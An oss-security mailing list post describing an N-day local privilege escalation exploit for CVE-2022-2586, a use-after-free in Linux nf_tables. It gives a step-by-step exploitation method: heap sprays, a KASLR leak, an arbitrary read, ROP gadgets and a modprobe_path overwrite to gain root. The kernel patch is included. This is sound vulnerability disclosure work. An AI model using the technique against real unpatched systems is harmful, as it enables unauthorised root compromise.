Received: (qmail 7236 invoked by uid 550); 29 Aug 2022 20:01:54 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 12162 invoked from network); 29 Aug 2022 19:26:56 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
 date : message-id : content-type : mime-version; s=qualyscom;
 bh=Y7UoGAD4qk/1rIwSvuwVWHiG7hjM4gDHt3gMGhtjGjM=;
 b=bo7dmLZS9haxn+MUOaGZWiBaDjrLgZ4yj/SthOrw4uaBko8LN3y/kvBpHsDOLdDtoTBw
 67y7cFfXHKl/2PpyK+77lcPNi+1e0naCLV81jTKXy8aP3TKrPOJF/AmH9CjaRL5BSNGS
 ifSVR2SVkTCUcuPioXcgEEuHM54+2W7OWowWrPJSEC60C2hB6ndcokFBCTdm7Ixt7W0n
 DmOX1ipMLTMWLSm2vCuNi61sBOto/o5I024tqxb3Fqq7oNLfUrFOej9oNRSx8unCMyQZ
 6upQo2v5UOSvJVFj5KtXFfV42WpU3frCGc5LdpiC2qqgD4jHocAHlAqCGkoQUDdmH10E 6Q== 
Authentication-Results: ppops.net;
	spf=pass smtp.mailfrom=aguerrero@qualys.com
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=JOj8sxk/4qevI6J1RE80wRnTNxq/WSQNSAh4DvIEleBJ+7+JrpOZqZhvBXsekgSrIUrLbmryy/MaDn2X3S5P8oweHBVuUWPV6C6ZEx5sZGVHeWE9oyNVwUE3fugNeZwsnAF5tUrmOuir1ACUKf+rEYeaCLJNnG2ipz05IP+n9MO0MJCBjKQ9wId6PXWpeq6q1PpA31D1NFSy4YyoCjSiXN3NJeQSnfT7dQ4osCRPVjg1NHld9O8bRSgYXVqd8/U7/1clEWspDeCBGpye93WCAN/IoM7xOOv/Q6/NQRvcA5bOQURFsxe/xUDrBbvfbi730AybJgG8qGeYF0GS0cvb2Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=Y7UoGAD4qk/1rIwSvuwVWHiG7hjM4gDHt3gMGhtjGjM=;
 b=TB3i1Sj84AssHHel3dBU51qC7dsRTrvy7sa5ITc3DWHDrkqlcphqf4/TpzvCM6ourE4JkbBFLZEMckijutjQWaDxUBXQYtUL8MfIDRtXNwyu+tTwY7m+jZ65Go5Qw5ff5S9HSNbxp/Pk7e+DgScBJR7x54pH/vhPcw3VWOROuqzK5rHaV1aI6hZmQosMQHHw68P0HU1yV5vAMCDyorEvQGa2q+LopDBh1I4vf9KIpB5iBK9n8Ax9TkVpCIAxOFYz48TzJ6kyrj/bUlCIbZL8S5+FkSx5GxByDFLnMP7mEW4CWamZ4223hyl9ac8QPvoMcRhZ0Euoguo80a7zP8xUew==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=Y7UoGAD4qk/1rIwSvuwVWHiG7hjM4gDHt3gMGhtjGjM=;
 b=RGx5XSKbXxFc/LiBMfSW9dXXAKRHg6D4GP1+76li73h6cHWN0Lcoy+o3JdAk6WIv/A0ImiTc5m79ilWVaAZ9+J3ghbzIDlXfq2277JKUA3/pbJNm9PnZUuNgvf+GJvhWhX9rE8xswOoqk4D+z1DREk50Rmx2EQRmYZ9vIee5y84I+cI6admPDi++zM7ZGs6tee0okV66uNxLvNP+FdQXf1RmpCjSJMz5FVSMRJUiQg/YvNawc1oTAICGBMxLv6U3ZG3d5zm72XMZjoXGtcg92bAnqWFteQXRKw0GmLts7/LnsarBgkWeR9Txk31GFkNd7Dlf7yUUMa4V0v4DJNCmYg==
From: Alejandro Guerrero <aguerrero@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: N-day exploit for CVE-2022-2586: Linux kernel nft_object UAF
Thread-Index: AQHYu9viYY+JMLwZN0aCbDR7B13yKg==
Date: Mon, 29 Aug 2022 19:26:39 +0000
Message-ID: 
 <SA1PR06MB8071EFD7F55B335FB7D01E87D8769@SA1PR06MB8071.namprd06.prod.outlook.com>
Accept-Language: es-ES, en-US
Content-Language: en-US
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator: 
x-ms-publictraffictype: Email
x-ms-office365-filtering-correlation-id: 736b4111-09bb-4a1b-f64a-08da89f4655d
x-ms-traffictypediagnostic: MWHPR0601MB3628:EE_
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 
 na2zmLhO123mtqY7PMFWoLBfGan6YSpRxSkWdA++YZCzx1AJUOCo5qHP9Ot/+hEMW0K+s8XhKsRYVMXP1NvQXCnd4mcM9ZN5+PLgHSwEHRYIEbHTCUTwSArMSoLQL0HHbHvtXY5zf7X20gg9TXyrEgax8hEWLdvV0USd8QZulnhvGAysSIdRrlI+3W29H8ZZNOSfWAwrgEN0gZ8uC32OdNtOYufYQQzSDagD9jzgKqjXcrViL4E6wDQhsM01w7owvJ4irRwFtvD27Opk9c+1msmIEdBWd175kvSKWzrhoc6G78t4G4j4rNnIQKvCfiOb19+J1bUWuhYY8Iqj4v00/AYS7dGfZn3FfGngz21JBDbne5JuHPPBppTM0P6juppTtyz8Gd7/cTeOyknFF+jckDTSoeLKLW/f3MW5XvU0UuqZU51jcR+X8PPobGocAMlWg5SEFbu7rjrPm1jByDDAoSFNhgBbExYRK/XRyvPedBu42LJMNzTWz5SL4BzLvUJXyvY5yexC5+yD+S0VUhQ/lUCWQ1nNv/jMRmcs0wk6zJ+5uBjPcxD5r1nLZ52IEfOih17VOLdyyhilI25MjNy6W3iaaIjH9/6np4hnZ06sd9QdvM7PaD4XstM0WkJA6HzTJ0xm2FNifjVyCeS+wFoK4T6bRsTMhAykxSmZf5aZcKt9WWMraVGc8ju6IbRgO57Bq3vCsqtoTLMY50dAIsCL0yDAYxeuSacPtiU9WHnM3JrmbPWtuDvci0io54+S+XEvmR+IVflx6XFKMPVwHDgxmyfoFvJCtRcYF3UuMbwtSi79knMeHxvNwdeJYvyKEEtKC6ldQnA1Uho/M69Z1uD/GQ==
x-forefront-antispam-report: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SA1PR06MB8071.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230016)(376002)(39860400002)(346002)(136003)(396003)(366004)(91956017)(66476007)(66446008)(64756008)(66946007)(76116006)(6916009)(2906002)(316002)(99936003)(38100700002)(38070700005)(9686003)(478600001)(66556008)(8676002)(71200400001)(83380400001)(30864003)(5660300002)(41300700001)(52536014)(122000001)(55016003)(33656002)(8936002)(6506007)(86362001)(7696005)(186003)(26005)(579004);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: 
 =?us-ascii?Q?52Jz9FefC+ho9LPDQdoMRaGtKX4YgxARs5R/FjE1gbncOQuCpafaUTAqmm8a?=
 =?us-ascii?Q?MpYWR0uJURRDNyyoDQI+pXMHHDQIjHe8zg2vezUYOh/uFp3CkrlH4WP14mSR?=
 =?us-ascii?Q?0zb0YLYxiiYFpzfXbKOXylWrqLs26fNOk2xuIk6dL8CJQwyPcRtkQ0RXK5KL?=
 =?us-ascii?Q?lYlguTpw7iK+WAj1lb1V5ej9GcMRB2kZN+nE0fQwBwLRD7Ij8W/zx4pLHEhd?=
 =?us-ascii?Q?JkNtJZU36L924RbUiEIXp8t3ZIHaNI9xN6H2AqhMoc+XVX+5JuuemYWkLs23?=
 =?us-ascii?Q?FA0l5NOQ0AGJUJ5xqVpuVcL7lJSLWJCzEsmMJ03P/DGlak/KjtF7hw8gFc8/?=
 =?us-ascii?Q?jhYlsMiUdAKyv3vK5F3QEB9JiHyxQWg0pp9rW4KGr5NsQwStnmSMbnlML2QL?=
 =?us-ascii?Q?KuM9IZaxFPfLGgkh/V5PwYkEyH+XIBVI3j6fFiiUiNVplK+OQGpE6V0m4SfE?=
 =?us-ascii?Q?E7knhVNH/eCtlosKCq48nh8xDPDhZ9GCW5KV4gOXgEJ8teoGD9Vib2nA90Qw?=
 =?us-ascii?Q?RfljFjYo7m4vg4QvDezajq/WoElSjxhV1dXOJWZhZQwKq2PzFIdafL4UBdKn?=
 =?us-ascii?Q?L131GVvH5/Q08LgOrVGPRcGach8lfgnqHNTpkorNzD9hDDdrtydhmSPVwX3W?=
 =?us-ascii?Q?Nb6W6QmsFXIVRdBJBsLxN37765t22wz8qx0bfiFtbTiwmbnK1UfqwXbiygJf?=
 =?us-ascii?Q?74fwOsgVGOCi2xZQJ48LT1j0gl8TG+Cs1vXrdoYqEAsuUjbxNdKxDFPisnJA?=
 =?us-ascii?Q?9zSKB0/i3B3onQ4lI6fELRS+YtVYxOyS+a/i8qhG68f6hHbkztteymU/lNtJ?=
 =?us-ascii?Q?1qLnQB5VaMKWID54d6Uzib+3BG+yzL30LfPMg/bwzZx0l1CovuUaq6vIwmVY?=
 =?us-ascii?Q?P26kyhJrKvLscSbnS7GBl8pKwHKt7/u/+XR+9oDNgZAvlMknSHrZZKdkxRE8?=
 =?us-ascii?Q?Etm1RxynK6d29EhQgt608a/cedlJO6i6xuSms6vN3DWOd+4YYXzV15g13DO6?=
 =?us-ascii?Q?V7U9D7WgPFDjXjRrZ0gJ2C7BHl/JKP9MZbIDMwoZ5UzH7jP9Ta40OH/7U9Hz?=
 =?us-ascii?Q?CPfceg0rfWeGTELYBXL5nlPGP0GmS1a3Pc1LwTOYbjnLJpKYPaC160jNiweJ?=
 =?us-ascii?Q?tLwLmn3+RYXS26XY99b/nRMlRJKwg2R5EYJ9HL1ABzI05k+K7P6E8ogYZLm/?=
 =?us-ascii?Q?YP9Mz8zHhRJkM8TRgHDssK8h7IU+cGuXGBpKPV0cjYWm2u8Mb8qK33TXShn8?=
 =?us-ascii?Q?9WEGUpkY9RNAuQDxCSYfDxGHjFcQf/YKPNa0TrMr+S65C3epKbN41sS6slts?=
 =?us-ascii?Q?jEcZrM/Uan5AF2TM9LDTYkLJIRstghoiHWO4jwXIbtxyCPoRVI0Yv3FhAdt5?=
 =?us-ascii?Q?2e+SPK3sx9Hdxz/EMjkWaC7WTrMKwblGr1iPKNOAFDuwcsmr7ImJF0DHbdC8?=
 =?us-ascii?Q?ZsGzVmP9aCRMvotBjWpEtJuIV6mpbOYsq/wDDD9PFBRU4W7FdKJKN0pJe06q?=
 =?us-ascii?Q?YmmANk835b5EGsDQ1WF5J7g1ZeuMoATtE79gxYtJ1fBgevhxzsqraQIdQaaS?=
 =?us-ascii?Q?FeU8aPbf4nBfTGFE/6x6e3pBASDmroOrDmrY63cXl8G77FucNllT3s5uMpyb?=
 =?us-ascii?Q?OQ=3D=3D?=
Content-Type: multipart/mixed;
	boundary="_004_SA1PR06MB8071EFD7F55B335FB7D01E87D8769SA1PR06MB8071namp_"
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SA1PR06MB8071.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 736b4111-09bb-4a1b-f64a-08da89f4655d
X-MS-Exchange-CrossTenant-originalarrivaltime: 29 Aug 2022 19:26:39.1716
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: 9ugZxz+fblSKu8dFWBC5H+MX/bevWA5IHTMXQZ6FR/Q/E0SBw7qZi5rWQgNPomdTdrr1Fi9dyGiQ7mmNTEA0nw==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: MWHPR0601MB3628
X-Proofpoint-GUID: g_6bPPQezXR-EeM39GzrF8mzpqk8u_zM
X-Proofpoint-ORIG-GUID: g_6bPPQezXR-EeM39GzrF8mzpqk8u_zM
X-Proofpoint-SPF-Result: pass
X-Proofpoint-SPF-Record: v=spf1 include:_spf.qualys.com include:spf.protection.outlook.com
 include:spf-001ca501.pphosted.com include:stspg-customer.com
 include:_spf.salesforce.com include:mktomail.com
 include:emailus.freshservice.com a:sendgrid.avolio.tech ~all
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.205,Aquarius:18.0.895,Hydra:6.0.517,FMLib:17.11.122.1
 definitions=2022-08-29_09,2022-08-25_01,2022-06-22_01
X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0 mlxlogscore=999
 impostorscore=0 lowpriorityscore=0 malwarescore=0 adultscore=0 spamscore=0
 suspectscore=0 priorityscore=1501 phishscore=0 bulkscore=0 clxscore=1034
 mlxscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.12.0-2207270000 definitions=main-2208290090
Subject: [oss-security] N-day exploit for CVE-2022-2586: Linux kernel nft_object UAF

--_004_SA1PR06MB8071EFD7F55B335FB7D01E87D8769SA1PR06MB8071namp_
Content-Type: multipart/alternative;
	boundary="_000_SA1PR06MB8071EFD7F55B335FB7D01E87D8769SA1PR06MB8071namp_"

--_000_SA1PR06MB8071EFD7F55B335FB7D01E87D8769SA1PR06MB8071namp_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

Hi all,

I developed an N-day exploit for CVE-2022-2586. Here is a short writeup and=
 an exploit is attached.

# Exploiting CVE-2022-2586: Linux kernel nft_object use-after-free

On the 9th of August, patches for a vulnerability in the Linux kernel used =
in Pwn2Own Vancouver (CVE-2022-2586) were made public.

Thanks to [Team Orca of Sea Security](https://twitter.com/Seasecresponse) f=
or this amazing discovery.

The vulnerability is a Use-After-Free (UAF) in nf_tables, that makes it pos=
sible to escalate privileges from any user to root, and it is present since=
 kernel version v3.16-rc1. To exploit this bug we need to enter a new netwo=
rk namespace to obtain `CAP_NET_ADMIN` (i.e: unprivileged user namespaces m=
ust be enabled, which is the case on most Linux distributions nowadays).

Our exploit has been tested in a Ubuntu 20.04 with kernel 5.12.13.

In this post we will analyze the process we adopted to exploit this use-aft=
er-free to achieve Local Privilege Escalation (LPE), bypassing all the defa=
ult mitigations (SMEP, SMAP, KASLR, Heap randomization, ...)

# Vulnerability analysis

The vulnerability is located in the netfilter subsystem. A feature in netfi=
lter allows referencing sets from other tables in the same batch, so you ar=
e in the context of a specific table A, and are able to operate with a set =
in table B by using its `SET_ID`. This way you can cross-reference objects =
from the current table, and references will be created in the set from the =
second table.

Once the first table is removed, all the member objects, as well as the tab=
le itself, are kfree()'d, but the references will be kept in the second tab=
le, so we can reach a use-after-free condition.

When we provide a `SET_ID` to lookup a set, this is the general involved fu=
nction:

```c
struct nft_set *nft_set_lookup_global(const struct net *net,
                                                  const struct nft_table *t=
able,
                                                  const struct nlattr *nla_=
set_name,
                                                  const struct nlattr *nla_=
set_id,
                                                  u8 genmask)
{
           struct nft_set *set;

           set =3D nft_set_lookup(table, nla_set_name, genmask);
           if (IS_ERR(set)) {
                      if (!nla_set_id)
                                 return set;

                      set =3D nft_set_lookup_byid(net, nla_set_id, genmask);
           }
           return set;
}
EXPORT_SYMBOL_GPL(nft_set_lookup_global);
```

Which ends up calling `nft_set_lookup_byid()`:

```c
static struct nft_set *nft_set_lookup_byid(const struct net *net,
                                                          const struct nlat=
tr *nla, u8 genmask)
{
           struct nft_trans *trans;
           u32 id =3D ntohl(nla_get_be32(nla));

           list_for_each_entry(trans, &net->nft.commit_list, list) {
                      if (trans->msg_type =3D=3D NFT_MSG_NEWSET) {
                                 struct nft_set *set =3D nft_trans_set(tran=
s);

                                 if (id =3D=3D nft_trans_set_id(trans) &&
                                     nft_active_genmask(set, genmask))
                                            return set;
                      }
           }
           return ERR_PTR(-ENOENT);
}
```

We can see below how the reference is made when setting `NFTA_SET_ELEM_OBJR=
EF` on creating a set element (`nft_add_set_elem()` at `nf_tables_api.c`):

```c

...

if (obj) {
           *nft_set_ext_obj(ext) =3D obj;
           obj->use++;
}

...

```

## Triggering the Use-After-Free

Once we left a reference in a second table after removing the first, we can=
 operate over the object.

An object is defined as the following:

```c
struct nft_object {
           struct list_head                list;
           struct rhlist_head            rhlhead;
           struct nft_object_hash_key     key;
           u32                                     genmask:2,
                                                       use:30;
           u64                                     handle;
           u16                                     udlen;
           u8                                       *udata;
           /* runtime data below here */
           const struct nft_object_ops     *ops ____cacheline_aligned;
           unsigned char                             data[]
                      __attribute__((aligned(__alignof__(u64))));
};
```

To reference an object from a table, we can use `NFT_SET_EXT_OBJREF`. This =
feature is helpful when used in maps, as we can use a different object (eg.=
: counter) when a specific index (like a port) is found in the set/map. Exa=
mple:

```
table ip foo {
           counter cnt_obj {
                      packets 0 bytes 0
           }

           map set1 {
                      type inet_service : counter
                      elements =3D { 1337 : "cnt_obj" }
           }

           chain output {
                      type filter hook output priority filter; policy accep=
t;
                      counter name tcp dport map @set1
           }
}
```

This reference is not heavily used, in fact, there are just a few operation=
s applied over it. First, every time we request its name, the contents of `=
obj->key.name` are read. Every time a new reference is created (e.g: in a m=
ap) the `obj->use` will be increased, and will be decreased every time we r=
emove an element with its reference.

Another access we can force is the object functionality itself, for example=
, in counters there is a percpu pointer that is used to access a structure =
where the values for the number of packets and data are increased or decrea=
sed. The interesting point is that to reach this through a map, the followi=
ng code is executed:

```c
static void nft_objref_map_eval(const struct nft_expr *expr,
                                            struct nft_regs *regs,
                                            const struct nft_pktinfo *pkt)
{
           struct nft_objref_map *priv =3D nft_expr_priv(expr);
           const struct nft_set *set =3D priv->set;
           const struct nft_set_ext *ext;
           struct nft_object *obj;
           bool found;

           found =3D set->ops->lookup(nft_net(pkt), set, &regs->data[priv->=
sreg],
                                            &ext);
           if (!found) {
                      regs->verdict.code =3D NFT_BREAK;
                      return;
           }
           obj =3D *nft_set_ext_obj(ext);
           obj->ops->eval(obj, regs, pkt);
}
```

There is a dereference of `obj->ops->eval`, which means that if as part of =
the use-after-free we can take control of the object and modify `obj->ops`,=
 we have the possibility of hijacking RIP and the legitimate execution flow=
 to escalate our privileges.

## Achieving KASLR leak

As already mentioned, we can issue reads over `obj->key.name` to retrieve t=
he name of the object. This is an important functionality in the exploitati=
on as it will give us interesting leaks and primitives.

On object creation, we can specify a string for the name of the object. Thi=
s is interesting as we can craft a string of a specific size to enter the `=
obj->key.name` allocation in a specific slab of our need / interest.

The designed KASLR leak primitive is pretty straightforward: As `seq_operat=
ions` structs are of 0x20 bytes, we can provide a `0x1f`-sized string (allo=
cation is made with string size plus one for the null terminator) so that w=
hen `obj->key.name` is freed, spraying with `seq_operations` will make one =
of them allocated in the space we had our string placed in.

We can request the name of the object now and the contents of `seq_operatio=
ns` will be returned to us, resulting in a `single_open` leak, allowing us =
to calculate the base for KASLR.

## Designing the strategy

At this point, we realize that if we want to hijack the `obj->ops->eval` ex=
ecution, we will need a way to store a fake `nft_object_ops` struct in kern=
el memory (due to SMAP migitation), and predict its address to place it in =
`obj->ops`.

We can achieve this condition by applying the following process:

1) Trigger the use-after-free and provide a 0xc7-sized string (`nft_object`=
 counter allocation size).
2) Create another table.
3) Spray with `nft_object` structs by adding multiple objects to the last c=
reated table.
4) If it succeeds, a `nft_object` struct will occupy the memory space where=
 the string was.
5) Request the string name for the UAF'ed object, the `list.next` pointer w=
ill be leaked.
6) The last step leaked `&table->chain`, which is a `list_head` structure i=
nside a `nft_table`.
7) Prepare another UAF condition and spray by using the table userdata feat=
ure (in table creation) to force `nla_memdup()` allocations to occupy the `=
nft_object`.
8) Place in the `nft_object` of the UAF the leaked address of `&table->chai=
n`.
9) Request the name of the object to leak `table->chain.next`, which has th=
e address of one of the sprayed `nft_object` structs.
10) Delete the third table to free all the sprayed `nft_object` structs.
11) By using the userdata feature again, spray with table creation to make =
`nla_memdup()` allocations (0xc7-sized) to occupy the now freed `nft_object=
` structs.
12) Those `nla_memdup()` allocations will fill all the structs with a fake =
`nft_object_ops`.

After all these steps, we know for certain that the struct for which we kno=
w the address, contains a fake `nft_object_ops` struct. This covers all the=
 requirements for the exploitation to work, which are:

a) Know the KASLR base (predict address for gadgets and functions)

b) Know a heap address with our arbitrary contents (predict address with ou=
r fake `obj->ops`)

### Leaking ctx->table address

Using the same trick we used in the KASLR base prediction phase, we can mak=
e a `nft_object` be allocated right where our string was.

We can do this by providing a 0xc7-sized string for the object name:

```c

...

obj->key.table =3D table;
obj->handle =3D nf_tables_alloc_handle(table);

obj->key.name =3D nla_strdup(nla[NFTA_OBJ_NAME], GFP_KERNEL);
if (!obj->key.name) {
           err =3D -ENOMEM;
           goto err_strdup;
}

...

```

This will leak us the `list.next` entry, that points to `&table->objects` (=
which is a `list_head` struct):

```c
struct nft_table {
           struct list_head                list;
           struct rhltable                             chains_ht;
           struct list_head                chains;
           struct list_head                sets;
           struct list_head                objects;
           struct list_head                flowtables;
           u64                                     hgenerator;
           u64                                     handle;
           u32                                     use;
           u16                                     family:6,
                                                       flags:8,
                                                       genmask:2;
           u32                                     nlpid;
           char                                    *name;
           u16                                     udlen;
           u8                                       *udata;
};
```

### Achieving arbitrary read primitive

Through the `obj->key.name`, by taking control of a freed-but-referenced `n=
ft_object`, we can achieve an arbitrary read primitive to read strings (or =
any data until a null terminator) at any valid address in memory.

To take over the control of a `nft_object` struct, we can use `nla_memdup()=
` from the userdata buffers added to tables when setting `NFTA_TABLE_USERDA=
TA` on table creation:

```c

...

if (nla[NFTA_TABLE_USERDATA]) {
           table->udata =3D nla_memdup(nla[NFTA_TABLE_USERDATA], GFP_KERNEL=
);
           if (table->udata =3D=3D NULL)
                      goto err_table_udata;

           table->udlen =3D nla_len(nla[NFTA_TABLE_USERDATA]);
}

...

```

As we have arbitrary size and data, we can replace the `nft_object` content=
s with our own, and, as we know the address of `&table->objects`, we can ge=
t the address of one of the sprayed `nft_object` structs that is pointed to=
 by this entry. We have to point `obj->key.name` to this address and reques=
t the object name.

## Code execution and LPE

After we achieved all the requirements for the function pointer hijack to b=
e executed, this phase of the exploitation is a reuse of the previously men=
tioned primitives and refill techniques.

This is the definition of `nft_object_ops`:

```c
struct nft_object_ops {
           void                                    (*eval)(struct nft_objec=
t *obj,
                                                                  struct nf=
t_regs *regs,
                                                                  const str=
uct nft_pktinfo *pkt);
           unsigned int                                 size;
           int                                       (*init)(const struct n=
ft_ctx *ctx,
                                                                  const str=
uct nlattr *const tb[],
                                                                  struct nf=
t_object *obj);
           void                                    (*destroy)(const struct =
nft_ctx *ctx,
                                                                     struct=
 nft_object *obj);
           int                                       (*dump)(struct sk_buff=
 *skb,
                                                                  struct nf=
t_object *obj,
                                                                  bool rese=
t);
           void                                    (*update)(struct nft_obj=
ect *obj,
                                                                    struct =
nft_object *newobj);
           const struct nft_object_type    *type;
};
```

We need to first trigger the UAF, and use the `nla_memdup()` refill to take=
 control over `obj` and place our arbitrary contents there. We should point=
 `obj->ops` to the leaked `nft_object` address, where our stack pivot gadge=
t address is stored.

```c
obj =3D *nft_set_ext_obj(ext);
obj->ops->eval(obj, regs, pkt);
```

The first argument is the `obj` address itself, so we can find a stack pivo=
t gadget to move the stack to `obj` and execute a ROP chain to achieve arbi=
trary code execution.

We found the gadget: `push rdi ; pop rsp ; add cl, cl ; ret`, which is exac=
tly what we need. The ROP chain will use a write-what-where gadget to write=
 an arbitrary path into `modprobe_path`: `mov qword ptr [rdx], rax ; ret`.

We can finally force the kernel to execute our own script as root by execut=
ing a dummy script with magic numbers unknown to the kernel, resulting in a=
 call to `call_modprobe()` to execute the usermode helper, which is now our=
 custom path. This will allow us to obtain root privileges outside the netw=
ork namespace (in the initial namespace).

## Patch

The main patch is pretty simple. It just makes sure that the current table =
is the one the set we refer (using its `SET_ID`) belongs to:

```c
--- a/net/netfilter/nf_tables_api.c
+++ b/net/netfilter/nf_tables_api.c
@@ -3842,6 +3842,7 @@ static struct nft_set *nft_set_lookup_byhandle(const =
struct nft_table *table,
}
static struct nft_set *nft_set_lookup_byid(const struct net *net,
+                                                        const struct nft_t=
able *table,
                                                          const struct nlat=
tr *nla, u8 genmask)
{
           struct nftables_pernet *nft_net =3D nft_pernet(net);
@@ -3853,6 +3854,7 @@ static struct nft_set *nft_set_lookup_byid(const stru=
ct net *net,
                                 struct nft_set *set =3D nft_trans_set(tran=
s);
                                 if (id =3D=3D nft_trans_set_id(trans) &&
+                                   set->table =3D=3D table &&
                                     nft_active_genmask(set, genmask))
                                            return set;
                      }
@@ -3873,7 +3875,7 @@ struct nft_set *nft_set_lookup_global(const struct ne=
t *net,
                      if (!nla_set_id)
                                 return set;
-                    set =3D nft_set_lookup_byid(net, nla_set_id, genmask);
+                    set =3D nft_set_lookup_byid(net, table, nla_set_id, ge=
nmask);
           }
           return set;
}
```

## Conclusion

In this post we analyzed a use-after-free in the Linux Kernel and our solut=
ion to develop a LPE exploit that bypasses the default mitigations (SMAP, S=
MEP, KASLR, Heap randomization, ...).

## References

Patches:

- \[1\] [https://lore.kernel.org/netfilter-devel/20220809170148.164591-1-ca=
scardo@canonical.com/T/](https://lore.kernel.org/netfilter-devel/2022080917=
0148.164591-1-cascardo@canonical.com/T/)
- \[2\] [https://lore.kernel.org/all/20220819153832.533116527@linuxfoundati=
on.org/](https://lore.kernel.org/all/20220819153832.533116527@linuxfoundati=
on.org/)
- \[3\] [https://lore.kernel.org/lkml/20220819153832.580611023@linuxfoundat=
ion.org/](https://lore.kernel.org/lkml/20220819153832.580611023@linuxfounda=
tion.org/)

Advisory and disclosure:

- \[4\] [https://www.zerodayinitiative.com/advisories/ZDI-22-1118/](https:/=
/www.zerodayinitiative.com/advisories/ZDI-22-1118/)
- \[5\] [https://www.openwall.com/lists/oss-security/2022/08/09/5](https://=
www.openwall.com/lists/oss-security/2022/08/09/5)

Distribution kernel updates:

- \[6\] [https://ubuntu.com/security/CVE-2022-2586](https://ubuntu.com/secu=
rity/CVE-2022-2586)
- \[7\] [https://security-tracker.debian.org/tracker/CVE-2022-2586](https:/=
/security-tracker.debian.org/tracker/CVE-2022-2586)
- \[8\] [https://access.redhat.com/security/cve/cve-2022-2586](https://acce=
ss.redhat.com/security/cve/cve-2022-2586)


--_000_SA1PR06MB8071EFD7F55B335FB7D01E87D8769SA1PR06MB8071namp_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

<html xmlns:o=3D"urn:schemas-microsoft-com:office:office" xmlns:w=3D"urn:sc=
hemas-microsoft-com:office:word" xmlns:m=3D"http://schemas.microsoft.com/of=
fice/2004/12/omml" xmlns=3D"http://www.w3.org/TR/REC-html40">
<head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dus-ascii">
<meta name=3D"Generator" content=3D"Microsoft Word 15 (filtered medium)">
<style><!--
/* Font Definitions */
@font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
.MsoChpDefault
	{mso-style-type:export-only;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
--></style>
</head>
<body lang=3D"EN-US" style=3D"word-wrap:break-word">
<div class=3D"WordSection1">
<p class=3D"MsoNormal">Hi all,</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">I developed an N-day exploit for CVE-2022-2586. Here=
 is a short writeup and an exploit is attached.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal"># Exploiting CVE-2022-2586: Linux kernel nft_object =
use-after-free</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">On the 9th of August, patches for a vulnerability in=
 the Linux kernel used in Pwn2Own Vancouver (CVE-2022-2586) were made publi=
c.
</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Thanks to [Team Orca of Sea Security](https://twitte=
r.com/Seasecresponse) for this amazing discovery.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">The vulnerability is a Use-After-Free (UAF) in nf_ta=
bles, that makes it possible to escalate privileges from any user to root, =
and it is present since kernel version v3.16-rc1. To exploit this bug we ne=
ed to enter a new network namespace
 to obtain `CAP_NET_ADMIN` (i.e: unprivileged user namespaces must be enabl=
ed, which is the case on most Linux distributions nowadays).</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
